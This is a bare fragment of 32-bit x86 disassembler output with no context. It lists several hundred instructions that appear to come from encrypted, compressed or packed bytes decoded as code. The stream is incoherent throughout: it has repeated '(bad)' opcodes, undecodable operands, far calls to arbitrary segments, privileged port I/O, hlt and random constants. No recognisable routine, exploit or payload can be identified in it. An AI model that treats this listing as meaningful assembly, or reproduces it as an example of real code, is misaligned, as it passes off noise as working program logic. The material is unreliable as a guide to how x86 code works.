  41aecf:	test   al,0xeb
  41aed1:	nop
  41aed2:	pop    ebx
  41aed3:	jmp    0xa566bd20
  41aed8:	ds sbb eax,0x54e202f1
  41aede:	mov    dl,0x1c
  41aee0:	and    ch,BYTE PTR [eax+0x75b4a247]
  41aee6:	inc    esi
  41aee7:	pop    esp
  41aee8:	jnp    0x41af0f
  41aeea:	cmp    DWORD PTR [esi],esp
  41aeec:	and    al,0x6e
  41aeee:	pop    ebp
  41aeef:	sbb    al,0x3a
  41aef1:	add    cl,bl
  41aef3:	inc    ebx
  41aef4:	sub    dl,BYTE PTR [edx]
  41aef6:	cvtps2pd xmm1,QWORD PTR [ecx]
  41aef9:	add    eax,0xa65f9fea
  41aefe:	and    eax,0xa0b20df0
  41af03:	imul   ebx,ebx,0x78
  41af06:	stos   BYTE PTR es:[edi],al
  41af07:	leave  
  41af08:	mov    ecx,ecx
  41af0a:	stos   DWORD PTR es:[edi],eax
  41af0b:	(bad)  
  41af0d:	mov    dl,0x5d
  41af0f:	sub    ebx,ecx
  41af11:	pop    ss
  41af12:	xor    al,0x6c
  41af14:	fmul   QWORD PTR [edi]
  41af16:	sub    ah,BYTE PTR [esi-0x7e]
  41af19:	clc    
  41af1a:	jno    0x41aef1
  41af1c:	(bad)  
  41af1d:	pushf  
  41af1e:	mov    ds:0xb0d17049,al
  41af23:	dec    eax
  41af24:	add    al,0xb8
  41af26:	pushf  
  41af27:	fcmovne st,st(0)
  41af29:	loopne 0x41af5b
  41af2b:	cmp    al,0x2e
  41af2d:	mov    eax,ds:0x830ff533
  41af32:	aas    
  41af33:	ja     0x41af96
  41af35:	jge    0x41af2d
  41af37:	rcr    DWORD PTR [edi-0x63],cl
  41af3a:	ins    DWORD PTR es:[edi],dx
  41af3b:	fwait
  41af3c:	pop    edx
  41af3d:	lods   eax,DWORD PTR ds:[esi]
  41af3e:	xor    BYTE PTR [esi-0x2],bh
  41af41:	jp     0x41af6d
  41af43:	out    dx,eax
  41af44:	mov    ds:0x86b74029,eax
  41af49:	cmp    dh,dh
  41af4b:	lahf   
  41af4c:	popa   
  41af4d:	aad    0x0
  41af4f:	add    DWORD PTR [esi+edx*2-0x80],0x8a42503a
  41af57:	call   0x80a1:0xb7c4d05c
  41af5e:	sbb    ch,BYTE PTR [edi-0x6c]
  41af61:	daa    
  41af62:	sub    cl,BYTE PTR [ebx-0x2e6e741b]
  41af68:	mov    esp,DWORD PTR [esi+ecx*2]
  41af6b:	jmp    0x41afce
  41af6d:	iret   
  41af6e:	ss out dx,al
  41af70:	dec    eax
  41af71:	sub    BYTE PTR [ebp+0x580d9d3],bl
  41af77:	scas   al,BYTE PTR es:[edi]
  41af78:	and    BYTE PTR [edi+0x3657ef8a],dl
  41af7e:	pop    esp
  41af7f:	shr    DWORD PTR [esi+0x1d40e663],1
  41af85:	jae    0x41af40
  41af87:	push   0x6ff6280b
  41af8c:	ret    
  41af8d:	mov    BYTE PTR [edi-0x3927eadd],ah
  41af93:	mov    bh,0x24
  41af95:	mov    ecx,0xa8226589
  41af9a:	(bad)  
  41af9b:	outs   dx,BYTE PTR ds:[esi]
  41af9c:	inc    ecx
  41af9d:	jge    0x41af46
  41af9f:	mov    ?,WORD PTR [ebx]
  41afa1:	mov    al,BYTE PTR [edi-0x70]
  41afa4:	gs (bad) 
  41afa6:	(bad)  
  41afa7:	data16 fs icebp 
  41afaa:	pop    ds
  41afab:	mov    bh,0x20
  41afad:	mov    ebx,0x5951f248
  41afb2:	xlat   BYTE PTR ds:[ebx]
  41afb3:	adc    ch,dl
  41afb5:	mov    ebx,0x5daa5964
  41afba:	sub    BYTE PTR [ecx],ch
  41afbc:	jg     0x41af6d
  41afbe:	cmp    ebx,esi
  41afc0:	sbb    al,BYTE PTR [edx]
  41afc2:	scas   al,BYTE PTR es:[edi]
  41afc3:	jmp    0x713f:0x8d6786cf
  41afca:	ret    
  41afcb:	vpsrlq xmm2,xmm1,0x7d
  41afd0:	mov    ah,0x62
  41afd2:	fstp   TBYTE PTR [edi]
  41afd4:	mov    bh,0x94
  41afd6:	xchg   BYTE PTR [ebp+0xe],al
  41afd9:	ja     0x41b02c
  41afdb:	lea    edx,[ecx-0xf8a616d]
  41afe1:	icebp  
  41afe2:	rcr    BYTE PTR [esi],0xfd
  41afe5:	loopne 0x41b02a
  41afe7:	cmp    ecx,esp
  41afe9:	jo     0x41afdf
  41afeb:	and    DWORD PTR [ecx*8+0x6441f1d0],edi
  41aff2:	jecxz  0x41b025
  41aff4:	xchg   esi,eax
  41aff5:	bnd jb 0x41b018
  41aff8:	add    eax,0xd2307e3f
  41affd:	add    dl,BYTE PTR [edi-0x7564902b]
  41b003:	sbb    BYTE PTR [esi-0x7e950e66],0x22
  41b00a:	ret    0x1821
  41b00d:	ret    
  41b00e:	das    
  41b00f:	pop    ebx
  41b010:	sbb    DWORD PTR [ebp+0x765b240d],eax
  41b016:	dec    edx
  41b017:	or     dl,BYTE PTR [esi+0x2]
  41b01a:	sbb    ebx,DWORD PTR [esi+0x2e984a83]
  41b020:	inc    edi
  41b021:	sub    edx,esp
  41b023:	sbb    ah,BYTE PTR [eax]
  41b025:	and    dl,BYTE PTR [edx+edx*1+0x32]
  41b029:	push   ebx
  41b02a:	inc    ebp
  41b02b:	les    edi,FWORD PTR [ebx-0x61]
  41b02e:	dec    eax
  41b02f:	xchg   DWORD PTR [ecx],edx
  41b031:	pop    eax
  41b032:	inc    ebx
  41b033:	sahf   
  41b034:	(bad)  
  41b035:	xchg   esp,eax
  41b036:	xchg   ebp,eax
  41b037:	add    eax,0x1033162d
  41b03c:	stc    
  41b03d:	xchg   edx,eax
  41b03e:	mov    bh,0xf6
  41b040:	cmp    eax,0x56a8c2a
  41b045:	stos   DWORD PTR es:[edi],eax
  41b046:	retf   
  41b047:	ds jmp 0x41b015
  41b04a:	lds    esp,FWORD PTR [eax+0x13]
  41b04d:	leave  
  41b04e:	addr16 jmp 0x41affe
  41b051:	and    al,ah
  41b053:	in     eax,dx
  41b054:	das    
  41b055:	pop    es
  41b056:	enter  0x915,0xa
  41b05a:	outs   dx,DWORD PTR ds:[esi]
  41b05b:	in     al,0x8b
  41b05d:	shl    ebp,cl
  41b05f:	sahf   
  41b060:	imul   edx,DWORD PTR [esi],0xffffff8b
  41b063:	lds    ebx,FWORD PTR [eax+0x40]
  41b066:	fiadd  DWORD PTR [ecx-0x330adaa]
  41b06c:	and    al,0x2a
  41b06e:	add    ebx,ebp
  41b070:	mov    bh,0x6c
  41b072:	daa    
  41b073:	push   DWORD PTR [ebx]
  41b075:	cmp    eax,0x952e4c77
  41b07a:	lods   al,BYTE PTR ds:[esi]
  41b07b:	and    DWORD PTR [esi-0x744c160c],edi
  41b081:	mov    al,ds:0x70bc906c
  41b086:	dec    edx
  41b087:	test   al,0xae
  41b089:	call   0x9c1d:0x8e885fdb
  41b090:	add    ebx,DWORD PTR [ecx]
  41b092:	call   0xa615:0x2112acef
  41b099:	push   esp
  41b09a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b09b:	cld    
  41b09c:	and    esp,ecx
  41b09e:	rcl    DWORD PTR [esi+0x7a],cl
  41b0a1:	icebp  
  41b0a2:	mov    WORD PTR [eax+0x4b],?
  41b0a5:	sbb    al,0xbf
  41b0a7:	pop    eax
  41b0a8:	mov    esp,0x53f48883
  41b0ad:	sbb    cl,BYTE PTR [edi+0x4236da8b]
  41b0b3:	add    al,0xe1
  41b0b5:	push   ecx
  41b0b6:	pop    ebp
  41b0b7:	mov    eax,ds:0x81b90595
  41b0bc:	and    eax,0xbba115b
  41b0c1:	and    esi,ebp
  41b0c3:	adc    ebp,DWORD PTR [esi+0x4c]
  41b0c6:	(bad)  
  41b0c7:	jmp    FWORD PTR [edi-0x7fe9a2eb]
  41b0cd:	mov    edi,0xde16729a
  41b0d2:	pop    es
  41b0d3:	mov    ah,0xbe
  41b0d5:	std    
  41b0d6:	out    dx,eax
  41b0d7:	xor    dl,BYTE PTR [ecx+edi*4+0x6db7258b]
  41b0de:	jb     0x41b0cd
  41b0e0:	js     0x41b0f7
  41b0e2:	jne    0x41b0ba
  41b0e4:	mov    edx,0x7bfd5079
  41b0e9:	mov    cl,0x2b
  41b0eb:	mov    ebx,0x62c81c2e
  41b0f0:	pop    ds
  41b0f1:	mov    cs,WORD PTR [ebx-0xb]
  41b0f4:	call   FWORD PTR [eax-0x49a84b0a]
  41b0fa:	cs push 0x62
  41b0fd:	mov    edi,0x7cbe9718
  41b102:	in     al,dx
  41b103:	bound  ecx,QWORD PTR [ebx+0x5a]
  41b106:	mov    edi,es
  41b108:	cli    
  41b109:	push   ss
  41b10a:	out    dx,eax
  41b10b:	mov    ds:0x24d48e02,eax
  41b110:	pop    ecx
  41b111:	mov    al,0x8
  41b113:	jmp    0x41b0f6
  41b115:	cmc    
  41b116:	(bad)  
  41b117:	in     al,0x55
  41b119:	jns    0x41b0fd
  41b11b:	mov    ah,0xbd
  41b11d:	mov    eax,ds:0x949968ae
  41b122:	xchg   BYTE PTR [edx-0x28bd271a],bh
  41b128:	push   ebx
  41b129:	sub    edi,DWORD PTR [ebx+0x4c]
  41b12c:	std    
  41b12d:	pop    es
  41b12e:	les    edi,FWORD PTR [esi+0x4064fd0f]
  41b134:	arpl   WORD PTR [ebp+ecx*8+0x5935a8d],si
  41b13b:	outs   dx,DWORD PTR ds:[esi]
  41b13c:	hlt    
  41b13d:	dec    edx
  41b13e:	xchg   BYTE PTR [edi],ah
  41b140:	xchg   BYTE PTR [esi+0x6c0c0aac],ch
  41b146:	inc    ecx
  41b147:	aas    
  41b148:	pop    es
  41b149:	pop    esp
  41b14a:	dec    edi
  41b14b:	fsub   QWORD PTR [eax+edx*1]
  41b14e:	mov    esp,0x158d9c88
  41b153:	sbb    eax,0xfe87f9d5
  41b158:	fstp   st(0)
  41b15a:	loope  0x41b102
  41b15c:	sub    DWORD PTR [eax],edx
  41b15e:	cdq    
  41b15f:	adc    eax,0x28383e0f
  41b164:	adc    eax,0xa60479aa
  41b169:	cmp    al,0xeb
  41b16b:	js     0x41b195
  41b16d:	pop    ebp
  41b16e:	add    ah,0x89
  41b171:	sbb    al,0xad
  41b173:	stos   DWORD PTR es:[edi],eax
  41b174:	out    dx,al
  41b175:	mov    eax,0xf9fc
  41b17a:	add    BYTE PTR [eax],al
  41b17c:	add    BYTE PTR [eax],al
  41b17e:	add    BYTE PTR [eax],al
  41b180:	add    bl,ah
  41b182:	call   0xf8dd8217
  41b187:	jecxz  0x41b184
  41b189:	jns    0x41b1d5
  41b18b:	shr    ebp,0xed
  41b18e:	stc    
  41b18f:	inc    ebp
  41b190:	mov    edx,0x12ed0
  41b195:	scas   eax,DWORD PTR es:[edi]
  41b196:	add    eax,DWORD PTR [eax]
  41b198:	add    BYTE PTR [ebx-0x30275cc],ch
  41b19e:	adc    cl,dh
  41b1a0:	add    DWORD PTR [esi+0x18],ebp
  41b1a3:	(bad)  
  41b1a4:	mov    cl,0xe1
  41b1a6:	stc    
  41b1a7:	pop    edi
  41b1a8:	out    0x25,al
  41b1aa:	xor    cl,BYTE PTR [esi-0x38e8261]
  41b1b0:	mov    ecx,0xda736757
  41b1b5:	ja     0x41b195
  41b1b7:	pop    ebp
  41b1b8:	pusha  
  41b1b9:	(bad)  
  41b1bb:	fwait
  41b1bc:	ror    DWORD PTR [edi],0x8b
  41b1bf:	loopne 0x41b161
  41b1c1:	loop   0x41b14b
  41b1c3:	dec    ecx
  41b1c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1c5:	dec    ebp
  41b1c6:	test   eax,0x8c936932
  41b1cb:	cmp    DWORD PTR ds:0x89f59117,0xffffff92
  41b1d2:	or     cl,dh
  41b1d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1d5:	out    0xac,al
  41b1d7:	jb     0x41b18b
  41b1d9:	mov    esi,0x5c40ec9a
  41b1de:	mov    eax,ds:0x38c2058c
  41b1e3:	cmp    al,0xa3
  41b1e5:	popa   
  41b1e6:	test   DWORD PTR [eax],esp
  41b1e8:	loope  0x41b210
  41b1ea:	leave  
  41b1eb:	xor    DWORD PTR [esi+eiz*2+0x54],ebp
  41b1ef:	or     BYTE PTR [ecx-0x63],dl
  41b1f2:	addr16 sub ecx,edi
  41b1f5:	rcr    ch,cl
  41b1f7:	aas    
  41b1f8:	ftst   
  41b1fa:	mov    ds:0x1ddabc6,eax
  41b1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b200:	fs jmp 0x53dd:0x78223415
  41b208:	shl    BYTE PTR [esi],0x87
  41b20b:	das    
  41b20c:	test   al,0xf3
  41b20e:	stos   BYTE PTR es:[edi],al
  41b20f:	sbb    edi,DWORD PTR [edi-0x1ee41446]
  41b215:	cmp    DWORD PTR [ebp+0x18],0xa3286f2d
  41b21c:	push   ss
  41b21d:	lahf   
  41b21e:	std    
  41b21f:	lahf   
  41b220:	pop    ebx
  41b221:	les    edx,FWORD PTR [ebx]
  41b223:	rcr    DWORD PTR ss:[ecx],cl
  41b226:	stc    
  41b227:	(bad)  
  41b228:	scas   al,BYTE PTR es:[edi]
  41b229:	div    DWORD PTR [eax-0x61]
  41b22c:	out    0xf7,eax
  41b22e:	int3   
  41b22f:	sbb    eax,0x83dc39d9
  41b234:	aaa    
  41b235:	sbb    ebp,DWORD PTR [ebp-0x3c48d255]
  41b23b:	je     0x41b258
  41b23d:	in     al,0x28
  41b23f:	cmp    BYTE PTR [ecx+0x19ba782d],ah
  41b245:	repz mov ebp,0xe0da18b2
  41b24b:	pop    esp
  41b24c:	adc    al,0x2c
  41b24e:	inc    edx
  41b24f:	mov    esi,0xd9f9525c
  41b254:	das    
  41b255:	sbb    DWORD PTR [ebx],esi
  41b257:	mov    ebx,0x3121764e
  41b25c:	dec    ebp
  41b25d:	mov    ds:0x1db904cc,eax
  41b262:	fnstcw WORD PTR [eax-0x51]
  41b265:	jbe    0x41b2dd
  41b267:	jmp    0xab668205
  41b26c:	mov    al,0x34
  41b26e:	mov    BYTE PTR [ebp+0x23],dh
  41b271:	nop
  41b272:	dec    eax
  41b273:	push   ecx
  41b274:	jb     0x41b29c
  41b276:	gs inc ebx
  41b278:	test   cl,0x19
  41b27b:	inc    eax
  41b27c:	cmp    al,0x62
  41b27e:	jbe    0x41b2f0
  41b280:	mov    esp,DWORD PTR ds:0xf86d104a
  41b286:	xchg   ebp,eax
  41b287:	cmc    
  41b288:	mov    bh,0xd8
  41b28a:	mov    ch,0x11
  41b28c:	mov    dl,0xa8
  41b28e:	xchg   esi,eax
  41b28f:	fnsave [ecx]
  41b291:	int3   
  41b292:	pop    edi
  41b293:	in     eax,dx
  41b294:	push   0xffffffd3
  41b296:	mov    esi,0x90899eae
  41b29b:	fsubr  QWORD PTR [edi+0x47]
  41b29e:	sbb    DWORD PTR [edi+0x666e4799],esi
  41b2a4:	sti    
  41b2a5:	shl    bh,1
  41b2a7:	lods   eax,DWORD PTR ds:[esi]
  41b2a8:	pushf  
  41b2a9:	lods   eax,DWORD PTR ds:[esi]
  41b2aa:	push   0xf6661bed
  41b2af:	addr16 (bad) 
  41b2b1:	dec    esi
  41b2b2:	aam    0xe5
  41b2b4:	mov    DWORD PTR [eax+0x13c52ae1],ecx
  41b2ba:	mov    DWORD PTR [ebp+0x59161c13],esp
  41b2c0:	(bad)  
  41b2c1:	das    
  41b2c2:	in     eax,dx
  41b2c3:	or     edx,eax
  41b2c5:	shr    al,0xa4
  41b2c8:	rcr    esi,cl
  41b2ca:	(bad)  
  41b2cb:	push   0xaf574d32
  41b2d0:	retf   0x98e2
  41b2d3:	frstor [esi+0x55fefc31]
  41b2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2db:	push   eax
  41b2dc:	sbb    BYTE PTR [edi],dl
  41b2de:	cli    
  41b2df:	loopne 0x41b33c
  41b2e1:	pop    eax
  41b2e2:	xor    BYTE PTR [ebp-0x9d11c3a],al
  41b2e8:	mov    edi,0xf948c0c6
  41b2ed:	add    dh,dl
  41b2ef:	dec    edx
  41b2f0:	push   0x10
  41b2f2:	out    0x7c,al
  41b2f4:	mov    dh,BYTE PTR [edx]
  41b2f6:	adc    al,0x52
  41b2f8:	outs   dx,DWORD PTR ds:[esi]
  41b2f9:	rcl    ebx,1
  41b2fb:	in     al,dx
  41b2fc:	push   ebp
  41b2fd:	jl     0x41b36c
  41b2ff:	add    BYTE PTR [eax-0x5655bc31],ch
  41b305:	dec    esp
  41b306:	or     al,0x74
  41b308:	fdivr  QWORD PTR [eax-0x36fae81a]
  41b30e:	pop    es
  41b30f:	xor    ah,0x3e
  41b312:	inc    eax
  41b313:	ins    DWORD PTR es:[edi],dx
  41b314:	loopne 0x41b339
  41b316:	mov    ch,0xe4
  41b318:	ss cdq 
  41b31a:	inc    esi
  41b31b:	add    eax,0xdcce4ab6
  41b320:	lods   eax,DWORD PTR ds:[esi]
  41b321:	int    0xce
  41b323:	sub    edx,DWORD PTR [esi]
  41b325:	imul   eax,DWORD PTR [edx],0x577aed42
  41b32b:	iret   
  41b32c:	dec    edi
  41b32d:	pop    es
  41b32e:	add    dh,ch
  41b330:	xor    dh,BYTE PTR [ecx]
  41b332:	xchg   esi,eax
  41b333:	daa    
  41b334:	xor    eax,0x3ec1517f
  41b339:	add    al,bl
  41b33b:	mov    ebp,0x7ce24b65
  41b340:	xor    DWORD PTR [eax+0x71],edi
  41b343:	dec    ebx
  41b344:	sub    ebx,DWORD PTR [esi+0x7bba60e8]
  41b34a:	in     al,dx
  41b34b:	imul   esi,ecx,0x9186d8e6
  41b351:	test   DWORD PTR [eax],0x8348f06b
  41b357:	shl    BYTE PTR [edi+eiz*4+0x3985f789],cl
  41b35e:	mov    edx,0x3b11e567
  41b363:	or     BYTE PTR [edx-0x1b40fcf5],ah
  41b369:	add    esi,DWORD PTR [ecx-0x12]
  41b36c:	fsubr  st(6),st
  41b36e:	add    eax,0x32bf361f
  41b373:	lock sbb dl,BYTE PTR [edx]
  41b376:	es cmp bl,dh
  41b379:	adc    eax,0x8fb6e1b9
  41b37e:	jge    0x41b304
  41b380:	sub    eax,0x2de2f669
  41b385:	xlat   BYTE PTR ds:[ebx]
  41b386:	adc    eax,0x1c5dc2fd
  41b38b:	mov    ah,0x37
  41b38d:	and    eax,0x2f7dccc1
  41b392:	add    eax,0xf7e20c7a
  41b397:	rcr    DWORD PTR [esi],1
  41b399:	mov    al,ch
  41b39b:	ror    BYTE PTR [ebp-0x9],1
  41b39e:	mov    cl,0x78
  41b3a0:	popa   
  41b3a1:	imul   edx,DWORD PTR [eax],0xffffffb6
  41b3a4:	pop    ss
  41b3a5:	mov    bl,0x84
  41b3a7:	in     ax,dx
  41b3a9:	and    al,0x91
  41b3ab:	mov    WORD PTR [ebp-0x5d47fb51],es
  41b3b1:	mov    ecx,0xf706315a
  41b3b6:	xchg   esi,eax
  41b3b7:	retf   0x7970
  41b3ba:	in     eax,0x88
  41b3bc:	add    al,0x5
  41b3be:	ror    BYTE PTR ds:0xf3ccc779,1
  41b3c4:	fisub  DWORD PTR [eax+0x50b2b910]
  41b3ca:	sbb    eax,0x2293a9c9
  41b3cf:	pushf  
  41b3d0:	test   BYTE PTR [ecx],0x2f
  41b3d3:	push   edx
  41b3d4:	dec    ecx
  41b3d5:	sar    BYTE PTR [ebx],cl
  41b3d7:	and    esp,DWORD PTR [ecx+0x3d]
  41b3da:	in     al,dx
  41b3db:	fistp  QWORD PTR [esi]
  41b3dd:	in     eax,dx
  41b3de:	in     eax,0xaa
  41b3e0:	fdiv   DWORD PTR [ebx]
  41b3e2:	xchg   edx,eax
  41b3e3:	leave  
  41b3e4:	outs   dx,BYTE PTR ds:[esi]
  41b3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3e6:	ror    DWORD PTR [ecx+0x5d],cl
  41b3e9:	repnz xor ah,cl
  41b3ec:	sub    eax,0xef3c484a
  41b3f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3f2:	aas    
  41b3f3:	mov    ds:0xe509b005,eax
  41b3f8:	pop    ss
  41b3f9:	repnz repz not al
  41b3fd:	mov    dl,0x41
  41b3ff:	and    BYTE PTR [ebx],dh
  41b401:	cmp    eax,0x718d0968
  41b406:	xor    bh,BYTE PTR [ebx-0x2526c6ff]
  41b40c:	jle    0x41b48c
  41b40e:	jecxz  0x41b447
  41b410:	mov    BYTE PTR [ebx+ebp*2],bl
  41b413:	or     dl,cl
  41b415:	push   ecx
  41b416:	popf   
  41b417:	out    dx,al
  41b418:	repnz dec esp
  41b41a:	xor    al,0xc1
  41b41c:	ins    BYTE PTR es:[edi],dx
  41b41d:	bound  ebp,QWORD PTR [esi-0x38]
  41b420:	stc    
  41b421:	gs lock or al,0xfa
  41b425:	mov    ch,0x34
  41b427:	rol    DWORD PTR [esi],cl
  41b429:	bound  ebx,QWORD PTR [edi]
  41b42b:	and    al,0xda
  41b42d:	retf   0x860d
  41b430:	xchg   BYTE PTR [esp-0x3a],dh
  41b434:	cmp    al,0x63
  41b436:	xor    al,0x73
  41b438:	ret    0xbb9
  41b43b:	xchg   ecx,eax
  41b43c:	call   0x434f:0x17032268
  41b443:	ror    ebp,1
  41b445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b446:	xchg   esi,eax
  41b447:	mov    ecx,0x30d1784f
  41b44c:	add    al,0xd0
  41b44e:	pop    eax
  41b44f:	mov    eax,0x299d803e
  41b454:	adc    esi,DWORD PTR [eax-0x17]
  41b457:	ds add ecx,ebx
  41b45a:	loop   0x41b3de
  41b45c:	and    BYTE PTR [edi],dh
  41b45e:	retf   
  41b45f:	cmp    al,0xcd
  41b461:	mov    ds:0xb13b678a,al
  41b466:	or     BYTE PTR [ecx-0x4a],cl
  41b469:	lock push ecx
  41b46b:	mov    al,ds:0xfdf1106e
  41b470:	adc    BYTE PTR [edx],dh
  41b472:	mov    ?,WORD PTR [esi-0x2f]
  41b475:	cmp    DWORD PTR ds:0x3765c55b,edx
  41b47b:	xor    edi,DWORD PTR [eax-0x70f65d10]
  41b481:	pop    ecx
  41b482:	retf   
  41b483:	inc    edx
  41b484:	addr16 cdq 
  41b486:	jge    0x41b4fc
  41b488:	and    bl,BYTE PTR ds:0x3f2df760
  41b48e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b48f:	outs   dx,BYTE PTR ds:[esi]
  41b490:	or     ebx,DWORD PTR [esp+ecx*8-0x15c667b]
  41b497:	imul   edi,DWORD PTR [edi-0x17140d1d],0xffffffd7
  41b49e:	xor    al,BYTE PTR [ecx+0x7d]
  41b4a1:	mov    al,ds:0x8806fcc7
  41b4a6:	ss div esi
  41b4a9:	test   al,0x38
  41b4ab:	frstor [edi+0x430ad7a7]
  41b4b2:	cmc    
  41b4b3:	add    edx,ecx
  41b4b5:	jg     0x41b49d
  41b4b7:	push   cs
  41b4b8:	jne    0x41b494
  41b4ba:	scas   eax,DWORD PTR es:[edi]
  41b4bb:	fsubr  st(5),st
  41b4bd:	sbb    edx,esi
  41b4bf:	pop    es
  41b4c0:	add    eax,0xbb4b5fa0
  41b4c5:	and    dh,BYTE PTR ds:0xce789430
  41b4cb:	mov    cl,0x3b
  41b4cd:	jmp    0x84934a88
  41b4d2:	sbb    eax,DWORD PTR [edx]
  41b4d4:	inc    edx
  41b4d5:	or     DWORD PTR [esi],esp
  41b4d7:	ret    0xdf6d
  41b4da:	es ins BYTE PTR es:[edi],dx
  41b4dc:	cmp    ecx,DWORD PTR [esi-0x38]
  41b4df:	push   edi
  41b4e0:	mov    esi,0x14a51b14
  41b4e5:	and    eax,0x436355b
  41b4ea:	push   esi
  41b4eb:	or     eax,0x4cd947b3
  41b4f0:	repz leave 
  41b4f2:	xor    BYTE PTR [eax],dh
  41b4f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4f5:	mov    ecx,DWORD PTR [edx+0x1]
  41b4f8:	cmp    BYTE PTR [edx],al
  41b4fa:	jne    0x41b4b6
  41b4fc:	inc    esp
  41b4fd:	inc    ebp
  41b4fe:	mov    eax,0x35ec53f6
  41b503:	xacquire xchg BYTE PTR [edi+edi*4],bh
  41b507:	push   0x12754318
  41b50c:	(bad)  
  41b50e:	sbb    ebp,DWORD PTR [edx+0x6a]
  41b511:	and    al,0xa9
  41b513:	push   esi
  41b514:	mov    ds:0x190e5c2c,al
  41b519:	or     DWORD PTR [edi],edx
  41b51b:	enter  0xc62,0x1d
  41b51f:	rdpmc  
  41b521:	push   cs
  41b522:	dec    ebp
  41b523:	xchg   ecx,eax
  41b524:	(bad)  
  41b525:	ret    
  41b526:	rcl    DWORD PTR [edi],0xfd
  41b529:	or     al,0x51
  41b52b:	sti    
  41b52c:	cmp    al,BYTE PTR [edi+0x697fc72f]
  41b532:	mov    al,ds:0xc8a7420d
  41b537:	inc    edx
  41b538:	(bad)  
  41b539:	and    eax,0xedd07d8f
  41b53e:	push   0xd451e023
  41b543:	pop    ds
  41b544:	or     al,0xa6
  41b546:	pop    edx
  41b547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41b550:	add    dh,ch
  41b552:	data16 hlt 
  41b554:	lods   eax,DWORD PTR ds:[esi]
  41b555:	cld    
  41b556:	mov    edi,0xbcb067ff
  41b55b:	hlt    
  41b55c:	xor    eax,0x65161fea
  41b561:	jg     0x41b595
  41b563:	add    DWORD PTR [eax],eax
  41b565:	scas   eax,DWORD PTR es:[edi]
  41b566:	add    eax,DWORD PTR [eax]
  41b568:	add    BYTE PTR [ebp+0x7f23f783],bl
  41b56e:	loopne 0x41b516
  41b570:	mov    esp,0x5b44a39b
  41b575:	xor    DWORD PTR [edi],0x14
  41b578:	shr    BYTE PTR [ebp+eax*2-0x7d],cl
  41b57c:	mov    ah,0xb2
  41b57e:	sbb    al,al
  41b580:	push   esp
  41b581:	mov    edx,0x2413b1f9
  41b586:	push   edx
  41b587:	shl    DWORD PTR [esp+0x42],1
  41b58b:	add    eax,0x84671954
  41b590:	push   ebp
  41b591:	jb     0x41b5c8
  41b593:	mov    ebp,DWORD PTR [esi-0x47]
  41b596:	rcl    BYTE PTR [edx],cl
  41b598:	and    eax,0x75bc6e1
  41b59d:	(bad)  
  41b59e:	call   0xa769:0xecf9b002
  41b5a5:	sub    eax,DWORD PTR [ebx]
  41b5a7:	push   cs
  41b5a8:	mov    ecx,0xaf60b330
  41b5ad:	fadd   QWORD PTR [ebx-0x80]
  41b5b0:	test   al,0xf4
  41b5b2:	pop    ss
  41b5b3:	js     0x41b5b9
  41b5b5:	leave  
  41b5b6:	mov    bl,0x40
  41b5b8:	cld    
  41b5b9:	lods   eax,DWORD PTR ds:[esi]
  41b5ba:	aad    0xce
  41b5bc:	push   ss
  41b5bd:	or     eax,0x9018f693
  41b5c2:	(bad)  
  41b5c3:	cdq    
  41b5c4:	jecxz  0x41b587
  41b5c6:	jno    0x41b593
  41b5c8:	mov    dl,0x62
  41b5ca:	sti    
  41b5cb:	and    eax,DWORD PTR [esi+0x68]
  41b5ce:	retf   
  41b5cf:	pop    ebp
  41b5d0:	popa   
  41b5d1:	ret    
  41b5d2:	jl     0x41b60a
  41b5d4:	mov    ah,0x40
  41b5d6:	mov    ecx,0x7310846e
  41b5db:	les    esi,FWORD PTR [edi+ecx*2+0x7be1aff5]
  41b5e2:	xchg   esi,eax
  41b5e3:	xchg   esi,eax
  41b5e4:	adc    DWORD PTR [eax],esi
  41b5e6:	test   dl,0x11
  41b5e9:	xchg   esp,eax
  41b5ea:	xchg   ecx,eax
  41b5eb:	push   0xb43f4640
  41b5f0:	jle    0x41b63a
  41b5f2:	jnp    0x41b659
  41b5f4:	sub    bl,BYTE PTR [ebp+0x31]
  41b5f7:	lods   al,BYTE PTR ds:[esi]
  41b5f8:	test   DWORD PTR [ebp+0x3f8e7be6],ecx
  41b5fe:	cmp    al,0x8c
  41b600:	push   ecx
  41b601:	int    0x7d
  41b603:	xchg   ecx,eax
  41b604:	sbb    esi,DWORD PTR [edi]
  41b606:	pop    ds
  41b607:	outs   dx,BYTE PTR ds:[esi]
  41b608:	bound  eax,QWORD PTR ds:0xb3056427
  41b60e:	in     eax,dx
  41b60f:	int    0x95
  41b611:	sub    cl,BYTE PTR [eax]
  41b613:	push   edx
  41b614:	and    esp,esi
  41b616:	mov    BYTE PTR [ecx-0x34],0xed
  41b61a:	fldenv [ebx+0x78]
  41b61d:	xchg   edi,eax
  41b61e:	mov    ecx,0x4bf69c35
  41b623:	adc    BYTE PTR [edi+edx*4+0x68],dl
  41b627:	mov    dl,0x7a
  41b629:	loopne 0x41b5f5
  41b62b:	add    dl,BYTE PTR [edi-0x75969c96]
  41b631:	fist   DWORD PTR [eax]
  41b633:	out    dx,eax
  41b634:	mov    dl,0xc0
  41b636:	jl     0x41b678
  41b638:	jmp    0x41b691
  41b63a:	jge    0x41b621
  41b63c:	ret    
  41b63d:	jmp    0xa24bb68c
  41b642:	mov    ecx,DWORD PTR [ebx]
  41b644:	(bad)  
  41b645:	aam    0x76
  41b647:	xor    BYTE PTR [ecx+0x41],dl
  41b64a:	mov    dl,0x2b
  41b64c:	add    BYTE PTR [edi-0x53866b7e],ah
  41b652:	adc    eax,0xa7e1d6f8
  41b657:	inc    ecx
  41b658:	add    eax,0xcd82db8a
  41b65d:	das    
  41b65e:	(bad)  
  41b65f:	jmp    0xc799:0x6a56d52b
  41b666:	fmul   st,st(5)
  41b668:	leave  
  41b669:	and    bl,BYTE PTR [esp+ebp*1-0x8]
